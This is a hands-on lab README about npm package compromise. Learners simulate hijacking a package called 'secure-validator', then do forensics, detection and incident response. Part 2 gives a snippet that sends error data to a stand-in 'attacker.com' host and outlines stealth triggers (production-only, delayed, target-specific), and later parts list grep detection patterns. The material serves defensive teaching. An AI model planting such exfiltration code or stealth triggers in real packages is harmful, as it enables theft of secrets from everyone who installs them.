# Scenario 3: Compromised Package Attack 🎯

## 🎓 Learning Objectives

By completing this scenario, you will learn:
- How legitimate packages get hijacked by attackers
- Account takeover techniques in package ecosystems
- Methods attackers use to maintain persistence
- Techniques to detect compromised packages
- Incident response for supply chain breaches

## 📖 Background

**Package Compromise** occurs when attackers gain control of a legitimate, trusted package and inject malicious code. This is one of the most dangerous supply chain attacks because the package has already established trust.

### Common Attack Vectors:

1. **Credential Theft**: Stealing maintainer npm/PyPI credentials
2. **Social Engineering**: Tricking maintainers into adding malicious maintainers
3. **Account Takeover**: Exploiting weak passwords or no 2FA
4. **Abandoned Packages**: Taking over unmaintained packages
5. **Malicious Contributors**: Long-game infiltration

### Real-World Examples:

- **event-stream (2018)**: 
  - 2 million weekly downloads
  - New maintainer added cryptocurrency stealer
  - Targeted Copay Bitcoin wallet
  - Went undetected for weeks

- **ua-parser-js (2021)**:
  - 7 million weekly downloads
  - Maintainer account compromised
  - Versions 0.7.29, 0.8.0, 1.0.0 contained crypto miners
  - Used in Facebook, Apple, Amazon, Microsoft products

- **coa & rc (2021)**:
  - Maintainer account compromised
  - Password stealer injected
  - Affected React, Vue, Angular projects

- **colors.js & faker.js (2022)**:
  - Maintainer deliberately sabotaged own packages
  - Infinite loop causing denial of service
  - Affected thousands of projects

## 🎯 Scenario Description

**Scenario**: A popular npm package `secure-validator` (10M weekly downloads) has been compromised. You will:

1. **Attacker Role**: Compromise the package and inject malicious code
2. **Forensic Role**: Investigate and identify the compromise
3. **Responder Role**: Contain and remediate the incident

## 🔧 Setup

```bash
cd scenarios/03-compromised-package
export TESTBENCH_MODE=enabled
./setup.sh
```

## 📝 Lab Tasks

### Part 1: The Legitimate Package (15 minutes)

Examine the original, legitimate package:

```bash
cd legitimate-package/secure-validator
cat package.json
cat index.js
cat README.md
```

**Package Details**:
- Name: `secure-validator`
- Version: 2.5.3
- Purpose: Input validation and sanitization
- Weekly Downloads: 10,000,000+
- Maintainer: John Doe (john@example.com)

**Your Tasks**:
- Understand the package functionality
- Review the codebase
- Note the version history
- Identify potential injection points

### Part 2: The Attack - Account Compromise (25 minutes)

**Scenario**: Attacker has obtained the maintainer's npm credentials through:
- Phishing email with fake "npm security alert"
- Credentials: `johndoe` / `weakpassword123`
- No 2FA enabled on the account

**Your Mission**: Simulate the package compromise

#### Step 1: Gain Access Simulation

```bash
# In real attack: Attacker logs in with stolen credentials
# We simulate this by creating a compromised version

cd ../../compromised-package/secure-validator
```

#### Step 2: Inject Malicious Code

Your malicious payload should:
1. Maintain all original functionality (stealth)
2. Execute during common operations (e.g., validation)
3. Exfiltrate data (environment variables, files, etc.)
4. Be difficult to detect in code review
5. Use obfuscation techniques

**Template provided**: `./templates/compromised-package-template.js`

**Advanced Techniques**:

```javascript
// Technique 1: Hidden in error handling
try {
  // Normal code
} catch (e) {
  require('http').get('http://attacker.com/log?e=' + e);
  throw e; // Re-throw to appear normal
}

// Technique 2: Conditional execution
if (process.env.NODE_ENV === 'production') {
  // Malicious code only runs in production
}

// Technique 3: Time-delayed activation
setTimeout(() => {
  // Malicious code runs after 30 days
}, 30 * 24 * 60 * 60 * 1000);

// Technique 4: Specific target detection
if (process.cwd().includes('target-company-name')) {
  // Targeted attack on specific organization
}
```

#### Step 3: Version Bump and Publish

```bash
# Attacker publishes new "patch" version
# Users expect patches to be safe, so less scrutiny

# Edit package.json
# Change version from 2.5.3 to 2.5.4 (patch version)

# Publish to local registry (simulation)
npm publish --registry http://localhost:4873
```

#### Step 4: Test the Compromise

```bash
cd ../../victim-app

# Update package
npm install secure-validator@2.5.4

# Run application
export TESTBENCH_MODE=enabled
node index.js
```

### Part 3: Forensic Investigation (30 minutes)

**You're a security analyst**. Unusual activity has been reported. Investigate!

#### Investigation Step 1: Identify Suspicious Behavior

```bash
# Check application logs
cat victim-app/logs/app.log

# Monitor network traffic
./detection-tools/network-monitor.sh
```

**Red Flags**:
- Unexpected network connections
- Unusual CPU usage
- New outbound connections
- Suspicious file access

#### Investigation Step 2: Package Analysis

```bash
# Compare local legitimate vs compromised trees
cd forensics
node compare-versions.js ../legitimate-package/secure-validator ../compromised-package/secure-validator
```

**What to Look For**:
- Code changes in patch versions (suspicious for patches)
- New dependencies added
- Obfuscated code
- Network requests
- File system access
- Process spawning

#### Investigation Step 3: Diff Analysis

```bash
# Generate diff between versions
diff -ur ../legitimate-package/secure-validator ../compromised-package/secure-validator > compromise-diff.txt

# Review the diff
cat compromise-diff.txt
```

**Analysis Questions**:
- What code was added?
- Where was it added?
- Is it necessary for the stated functionality?
- Are there obfuscation attempts?

#### Investigation Step 4: Timeline Reconstruction

```bash
# Check npm registry for publish history
npm view secure-validator time

# Check git commits (if available)
cd ../legitimate-package/secure-validator
git log --oneline

# Check maintainer changes
npm owner ls secure-validator
```

**Build Timeline**:
- When was the package compromised?
- How long was it active?
- What versions are affected?
- Who published the malicious versions?

#### Investigation Step 5: Behavioral Analysis

Run the victim app with `TESTBENCH_MODE=enabled` while the mock server is up, then review `curl http://localhost:3000/captured-data`. For a full sandbox, use your org’s standard dynamic-analysis tooling.

Monitor:
- Network requests
- File operations
- Child processes
- System calls

### Part 4: Detection Methods (25 minutes)

Implement multiple detection layers:

#### Detection 1: Automated Scanning

```bash
cd detection-tools

# Run security scanner (included in this scenario)
node package-security-scanner.js ../victim-app

# Manual pattern hunt in the installed package
grep -nE 'http|child_process|eval\\(' ../victim-app/node_modules/secure-validator/index.js || true
```

#### Detection 2: Integrity Checking

```bash
# Verify package integrity (npm advisory database)
npm audit

# Inspect resolved version and lockfile (if present)
cd ../victim-app
npm list secure-validator
cat package-lock.json 2>/dev/null | head -80 || true
```

#### Detection 3: Behavior Monitoring

Create runtime monitoring:

```javascript
// monitoring-agent.js
const Module = require('module');
const originalRequire = Module.prototype.require;

Module.prototype.require = function(id) {
  console.log(`[MONITOR] Module required: ${id}`);
  
  // Detect suspicious requires
  if (['child_process', 'fs', 'http', 'https'].includes(id)) {
    console.warn(`[ALERT] Sensitive module accessed: ${id}`);
  }
  
  return originalRequire.apply(this, arguments);
};
```

#### Detection 4: Package Lock Validation

```bash
# Check if package-lock.json was modified
git diff package-lock.json

# Inspect integrity entries for secure-validator (if lockfile exists)
grep -A3 '"secure-validator"' package-lock.json 2>/dev/null || true
```

### Part 5: Incident Response & Mitigation (30 minutes)

**The package has been confirmed as compromised. Respond!**

#### Response Step 1: Immediate Containment

Illustrative commands (adapt to your environment; do not run destructive steps like editing `/etc/hosts` on a shared machine without approval):

```bash
# 1. Block or hold the package at registry/proxy policy (org-specific)

# 2. Remove from this lab app
cd victim-app
npm uninstall secure-validator

# 3. Clear local npm cache (testbench only)
npm cache clean --force

# 4. Alert your team via your real incident channel (Slack, PagerDuty, etc.)
```

#### Response Step 2: Impact Assessment

```bash
# In this repo: search for other uses of the package (example)
git grep -l secure-validator 2>/dev/null || true

# On a real registry: inspect published versions (requires network)
# npm view secure-validator versions

# In the lab, compromised versions are documented in this README (e.g. 2.5.4+)
```

#### Response Step 3: Remediation

**Option A: Pin to Safe Version**
```json
{
  "dependencies": {
    "secure-validator": "2.5.3"  // Last known good version
  }
}
```

**Option B: Replace with Alternative**
```bash
npm uninstall secure-validator
npm install validator  # Alternative package
```

**Option C: Fork and Audit**
```bash
# Create internal fork
git clone https://github.com/original/secure-validator
cd secure-validator
git checkout v2.5.3  # Safe version
# Publish to internal registry
```

#### Response Step 4: System Cleanup

```bash
# Review mock-server capture from this lab
curl -s http://localhost:3000/captured-data | head -c 4000

# Re-scan installed code for suspicious patterns
grep -rE 'http|child_process|eval' victim-app/node_modules/secure-validator 2>/dev/null || true

# In production: rotate any credentials that touched the compromised dependency
```

#### Response Step 5: Prevention

Implement preventive measures:

1. **Package Lock File Enforcement**:
   ```bash
   # In CI/CD, use npm ci instead of npm install
   npm ci --audit
   ```

2. **Dependency Pinning**:
   ```json
   {
     "dependencies": {
       "secure-validator": "2.5.3"  // Exact version
     }
   }
   ```

3. **Automated Scanning**:
   ```yaml
   # .github/workflows/security.yml
   - name: Security Audit
     run: |
       npm audit --audit-level=moderate
       npm run security-scan
   ```

4. **Package Integrity Verification**:
   ```bash
   # Verify package signatures
   npm install --integrity
   ```

5. **Runtime Monitoring**:
   - Deploy application monitoring
   - Alert on suspicious behavior
   - Log all package installations

## ✅ Success Criteria

You've completed this scenario when you can:
- [ ] Successfully compromise a package (simulation)
- [ ] Detect the compromise using multiple methods
- [ ] Conduct forensic analysis
- [ ] Create incident response plan
- [ ] Implement preventive controls
- [ ] Document lessons learned

## 🎁 Bonus Challenges

1. **Supply Chain Mapping**: Map all transitive dependencies
2. **Automated Response**: Create automated incident response
3. **Threat Hunting**: Find other potentially compromised packages
4. **SBOM Generation**: Create Software Bill of Materials
5. **Policy as Code**: Implement automated security policies

## 📊 Compromise Comparison

| Attack Vector | Difficulty | Detection | Impact | Duration |
|--------------|-----------|-----------|--------|----------|
| Typosquatting | Low | Medium | Individual | Hours |
| Dep. Confusion | Medium | Hard | Organization | Days |
| Compromised Pkg | High | Very Hard | Ecosystem | Weeks/Months |

## 🔍 Real-World Case Study: event-stream

### Timeline:

**September 2018**:
- Original maintainer transfers ownership to new maintainer
- New maintainer seemed legitimate, contributed for months

**October 2018**:
- Version 3.3.6 released with new dependency: `flatmap-stream`
- `flatmap-stream` contained cryptocurrency stealer
- Targeted Copay Bitcoin wallet users

**November 2018**:
- Discovered by security researcher
- Package removed from npm
- Damage assessment: Thousands of applications affected

### Lessons Learned:
- Trust but verify new maintainers
- Monitor dependency additions
- Automated scanning for suspicious code
- Community vigilance is crucial

## 💡 Key Takeaways

- **Trusted packages can be compromised** at any time
- **Patch versions aren't always safe** - audit everything
- **Detection is hard** - compromised packages look legitimate
- **Response must be rapid** - every hour counts
- **Defense in depth** - multiple detection layers needed
- **Community collaboration** is essential for supply chain security

## 📚 Additional Resources

- [npm Security Best Practices](https://docs.npmjs.com/security)
- [Sonatype State of Software Supply Chain Report](https://www.sonatype.com/resources/state-of-the-software-supply-chain)
- [CISA Supply Chain Security Guidance](https://www.cisa.gov/supply-chain)

---

**Next**: [Scenario 4: Malicious Update →](../04-malicious-update/README.md)

